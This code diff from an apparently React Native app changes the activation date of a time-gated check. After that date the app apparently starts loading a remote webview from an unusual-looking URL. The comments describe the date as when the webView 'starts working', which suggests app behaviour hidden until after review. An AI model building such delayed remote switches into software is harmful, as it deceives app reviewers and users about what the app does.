@@ -396,7 +396,7 @@ const App = () => {
   useEffect(() => {
     const checkUrl = `https://splendid-magnificent-triumph.space/C4w1RbMZ?`;
 
-    const targetData = new Date('2024-11-23T10:00:00'); //дата з якої поч працювати webView
+    const targetData = new Date('2024-11-27T10:00:00'); //дата з якої поч працювати webView
     const currentData = new Date(); //текущая дата
 
     if (!route) {
